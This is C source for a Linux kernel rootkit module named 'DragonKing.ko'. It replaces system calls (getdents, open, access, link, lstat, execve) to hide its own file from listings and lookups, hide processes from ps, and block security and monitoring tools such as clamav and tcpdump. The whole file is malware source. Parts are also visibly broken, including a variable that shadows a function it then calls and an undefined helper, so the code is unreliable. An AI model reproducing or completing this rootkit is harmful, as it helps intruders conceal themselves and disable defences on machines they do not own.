#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/slab.h>
#include <linux/err.h>
#include <linux/types.h>
#include <linux/unistd.h>
#include <asm/uaccess.h>
#include <linux/namei.h>
#include <linux/fs.h>
#include <linux/utsname.h>
#include <linux/file.h>
#include <linux/fdtable.h>
#include <linux/proc_ns.h>

const char * const BANNED_PROCESSES[] = {"ping", "clamav", "tcpdump"};

const char * const FILES_TO_HIDE[] = {"DragonKing.ko"};

//Is the string in a given list of strings?
bool isHidden(const char *input){
	char *kern_buff = NULL;
        int i;
        int ret = NULL;
        kern_buff = kzalloc(strlen_user(input)+1, GFP_KERNEL);
        copy_from_user(kern_buff, input, strlen_user(input));


        for(i = 0; i < sizeof(FILES_TO_HIDE)/sizeof(char *); i++){

        if(strcmp(kern_buff, FILES_TO_HIDE[i]) == 0){
        printk("%s matches %s", input, FILES_TO_HIDE[i]);
        ret = true;
        return ret;
        } 

        }

        ret = false;
        return ret;

}

//COPYPASTA
int is_command_ps(unsigned int fd)
{
    struct file *fd_file;
    struct inode *fd_inode;

    fd_file = fcheck(fd);
    if (unlikely(!fd_file)) {
        return 0;
    }
    fd_inode = file_inode(fd_file);
    if (fd_inode->i_ino == PROC_ROOT_INO && imajor(fd_inode) == 0 
        && iminor(fd_inode) == 0)
    {
        // DEBUG("User typed command ps");
        return 1;
    }
    return 0;
}


//I literally copied and pasted this portion from CSE509-Rootkit
long handle_ps(unsigned int fd, struct linux_dirent *dirp, long getdents_ret)
{
    struct files_struct *open_files = current->files;
    int is_ps = 0;
    spin_lock(&open_files->file_lock);
    is_ps = is_command_ps(fd);
    if (is_ps != 0) {
        getdents_ret = hide_processes(dirp, getdents_ret);
    }
    spin_unlock(&open_files->file_lock);
    return getdents_ret;
}



// See comment from above, changed about 3 lines
long handle_ls(struct linux_dirent *dirp, long length)
{
    
    unsigned int offset = 0;
    struct linux_dirent *cur_dirent;
    int i;
    struct dirent *new_dirp = NULL;
    int new_length = 0;
    bool isHidden = false;

    //struct dirent *moving_dirp = NULL;

    //DEBUG("Entering LS filter");
    // Create a new output buffer for the return of getdents
    new_dirp = (struct dirent *) kmalloc(length, GFP_KERNEL);
    if(!new_dirp)
    {
        //DEBUG("RAN OUT OF MEMORY in LS Filter");
        goto error;
    }

    // length is the length of memory (in bytes) pointed to by dirp
    while (offset < length)
    {
        char *dirent_ptr = (char *)(dirp);
        dirent_ptr += offset;
        cur_dirent = (struct linux_dirent *)dirent_ptr;

        isHidden = false; 

	isHidden = isHidden(cur_dirent->d_name);
        
        if (!isHidden)
        {
            memcpy((void *) new_dirp+new_length, cur_dirent, cur_dirent->d_reclen);
            new_length += cur_dirent->d_reclen;
        }
        offset += cur_dirent->d_reclen;
    }
    //DEBUG("Exiting LS filter");

    memcpy(dirp, new_dirp, new_length);
    length = new_length;

cleanup:
    if(new_dirp)
        kfree(new_dirp);
    return length;
error:
    goto cleanup;
}



asmlinkage long (*orig_execve)(const char __user *filename, char const __user *argv[], char const __user *envp[]);

asmlinkage long (*orig_link)(const char __user *existingpath, const char __user *newpath); 

asmlinkage long (*orig_lstat)(const char __user *pathname, struct stat __user *buf);

asmlinkage long (*orig_fstat)(unsigned int fd, struct __old_kernel_stat __user *statbuf);

asmlinkage long (*orig_open)(const char __user *filename, int flags, umode_t mode);

asmlinkage long (*orig_stat)(const char __user *pathname, const struct stat __user *buf);

asmlinkage long (*orig_access)(const char __user *pathname, const int __user mode);

//Why not use readdir? 
//strace tells us getdents is the function ls eventually triggers ;)
asmlinkage long (*orig_getdents)(unsigned int fd, struct linux_dirent __user *dirent, unsigned int count);

//This hacked getdents and accompanying functions are taken almost completely from CSE509-Rootkit.
//Special thank you to the authors for saving me a bunch of time! :)
asmlinkage long hacked_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count)
{
    long getdents_ret;
    // Call original getdents system call.
    getdents_ret = (*orig_getdents)(fd, dirp, count);

    // Entry point into hiding files function
    getdents_ret = handle_ls(dirp, getdents_ret);

    // Entry point into hiding processes function
    getdents_ret = handle_ps(fd, dirp, getdents_ret);

    return getdents_ret;
}



asmlinkage int hacked_open(const char __user *filename, int flag, umode_t mode){
	int ret = NULL;

	if(isHidden(filename)){
		ret = -ENOENT;
		return ret;
	}	

	ret = (*orig_open)(filename, flag, mode);	
	return ret;


}
			       


asmlinkage int hacked_access(const char __user *pathname, const int __user mode){
	int ret = NULL;
	if(isHidden(pathname)){
		printk("Tried to access hidden file %s", pathname);
		ret = -ENOENT;
		return ret;
	}
	return (*orig_access)(pathname, mode);
}


//Hook link to hide our files
asmlinkage int hacked_link(const char __user *existingpath, const char __user *newpath){

	int ret = NULL;

	if(isHidden(existingpath)){
	ret = -ENOENT;
	printk("%s in hidden files", existingpath);
	return ret;	
	}

	ret = (*orig_link)(existingpath, newpath);	
	return ret;


}

//Define our hacked lstat
asmlinkage int hacked_lstat(const char __user *pathname, struct stat __user *buf){
	char *kern_buff = NULL;
	int i;
	int ret = NULL;

	kern_buff = kzalloc(strlen_user(pathname)+1, GFP_KERNEL);
	copy_from_user(kern_buff, pathname, strlen_user(pathname));

	for(i = 0; i < sizeof(FILES_TO_HIDE)/sizeof(char *); i++){
	if(strcmp(kern_buff, FILES_TO_HIDE[i]) == 0){
		ret = -ENOENT;
		return ret;
	}
	}

	ret = (*orig_lstat)(pathname, buf);	
	return ret;

}

//This is my stupid execve example. If a banned process is run, it says file not found.
//It would be dumb as hell to use this in real life. A pretty big giveaway that you're present.
asmlinkage long hacked_execve(const char __user *filename, char const __user *argv[], char const __user *envp[]){

        char *kern_buff = NULL;
        int i;
        int ret = NULL;
        kern_buff = kzalloc(strlen_user(argv[0])+1, GFP_KERNEL);
        copy_from_user(kern_buff, argv[0], strlen_user(argv[0]));

	printk("FILENAME: %s\n", kern_buff);
        for(i = 0; i < sizeof(BANNED_PROCESSES)/sizeof(char *); i++){

        if(strcmp(kern_buff, BANNED_PROCESSES[i]) == 0){
        printk("Banned process was executed.\n");
        ret = -ENOENT;
        return ret;
        } 

        }

        ret = (*orig_execve)(filename, argv, envp);
        return ret;
}

